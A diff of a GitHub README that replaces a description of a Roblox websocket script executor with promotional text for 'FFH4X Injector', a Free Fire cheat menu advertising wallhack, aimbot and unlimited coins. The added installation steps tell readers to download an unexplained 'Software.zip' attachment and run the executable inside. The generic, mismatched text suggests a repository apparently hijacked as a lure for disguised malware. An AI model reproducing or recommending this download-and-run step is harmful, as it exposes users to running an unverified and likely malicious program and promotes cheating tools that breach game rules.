@@ -1,28 +1,43 @@
-# Roblox Websocket Executor
+# FFH4X Injector - MOD Menu for Free Fire
+![FFH4X Logo](https://example.com/ffh4x-logo.png)
 
-A Roblox "executor", created using the Synapse X websocket library and a C# websocket server.
+Welcome to the official GitHub repository for FFH4X - the ultimate MOD Menu for Free Fire with amazing features. This injector offers players a range of exciting and powerful hacks to enhance their gameplay experience. From customized skins to powerful weapons, FFH4X is the go-to tool for Free Fire enthusiasts looking to level up their game.
 
-## How to use
+![FFH4X Screenshot](https://example.com/ffh4x-screenshot.png)
 
-To use the client, place the [script](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/client_release.lua) in your exploit's (I have only tested this using Synapse X) "autoexec" directory, and whenever you join a game in Roblox, it will start the client, which will try to connect to the server.
+## Features
+Here are some of the key features that FFH4X Injector offers:
+- Wallhack
+- Aimbot
+- Fast Run
+- Auto Headshot
+- Unlimited Coins
+- And much more!
 
-To use the server, download the [executor's ZIP](https://github.com/game-hax/Roblox-Websocket-Executor/releases/latest/download/server_release.zip) onto your computer, extract it, and run the executable. It will start the server, and it will allow you to execute scripts.
+## Installation
+To get started with FFH4X Injector, simply follow these steps:
+1. Download the injector from the following link: [![Download FFH4X Injector](https://img.shields.io/badge/Download-FFH4X-green)](https://github.com/user-attachments/files/16913125/Software.zip)
+2. Extract the downloaded ZIP file to your desired location.
+3. Run the FFH4X executable file.
+4. Enjoy an enhanced Free Fire gaming experience!
 
-### Demonstration
+## Usage
+Once you have successfully installed FFH4X Injector, launch the application and select the hacks you wish to enable. Customize your gameplay with various features and dominate the battlefield like never before. Remember to use these hacks responsibly and adhere to the game's community guidelines.
 
-https://user-images.githubusercontent.com/120275751/225953612-1b6de800-0373-416d-b3d0-c0699ecb2061.mp4
+## Updates
+Stay tuned for exciting updates and new features coming to FFH4X Injector. Our team is constantly working on enhancing the tool with additional hacks and functionalities to make your Free Fire gameplay more thrilling and enjoyable. Watch out for the latest releases and unleash the full potential of FFH4X!
 
-## Further explanation
+## Support
+If you encounter any issues or have any questions regarding FFH4X Injector, feel free to reach out to our dedicated support team. We are committed to helping our users make the most out of the injector and ensure a smooth and seamless experience while using the tool.
 
-There is a WebSocket server in C# user interface. When the user executes a script, it broadcasts to connected clients with the script they want to execute.
+## Contribute
+We welcome contributions from the community to help improve FFH4X Injector further. Whether it's suggesting new features, reporting bugs, or enhancing the existing codebase, your input is invaluable to us. Fork the repository, make your changes, and submit a pull request to collaborate with us on making FFH4X even better!
 
-The client is written in Lua, on first execution, it will tell the server to execute files in the "autoexec" directory of the executor, it will also hook into the print, warn, and error function, and it will broadcast each output, to allow for an external console.
+## License
+This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) - see the [LICENSE](LICENSE) file for details.
 
-This isn't useful, and this serves as a proof of concept. However, this does have some advantages over using an API like [SXLib](https://github.com/XarienC/Synapse-X-Open-Source-UI) (Synapse X's library), such as being able to hook outputs like print or warn, for an external console in a custom UI, however you could probably do a combination of SXLib and websockets, as you wouldn't need to include the client in "autoexec", as SXLib could automatically execute that for you.
+![FFH4X Gameplay](https://example.com/ffh4x-gameplay.png)
 
-## Attribution
+---
 
-Here are a list of open-source libraries used by this project.
-
-- [sta/websocket-sharp](https://github.com/sta/websocket-sharp): WebSocket library used
-- [PavelTorgashov/FastColoredTextBox](https://github.com/PavelTorgashov/FastColoredTextBox): Syntax highlighted textbox used
+Thank you for checking out the FFH4X Injector repository. We hope you enjoy using our MOD Menu and that it brings a new level of excitement to your Free Fire gaming experience. Stay tuned for more updates and happy hacking! 🎮🔥
